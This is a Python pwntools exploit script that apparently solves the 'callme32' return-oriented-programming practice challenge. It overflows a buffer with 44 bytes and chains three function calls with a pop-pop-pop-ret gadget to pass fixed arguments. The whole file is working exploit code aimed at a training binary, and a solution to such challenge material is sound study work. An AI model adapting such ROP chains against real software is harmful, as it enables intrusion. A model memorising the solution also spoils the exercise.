from pwn import *
e = ELF("./callme32")
callme_one = p32(e.symbols["callme_one"])
callme_two = p32(e.symbols["callme_two"])
callme_three = p32(e.symbols["callme_three"])
pop_pop_pop_ret = p32(0x080488a9)
p = process("./callme32")
print p.recv()
payload = "a"*44
payload += callme_one+pop_pop_pop_ret+p32(1)+p32(2)+p32(3)
payload += callme_two+pop_pop_pop_ret+p32(1)+p32(2)+p32(3)
payload += callme_three+pop_pop_pop_ret+p32(1)+p32(2)+p32(3)

p.sendline(payload)
print p.recv()
p.interactive()


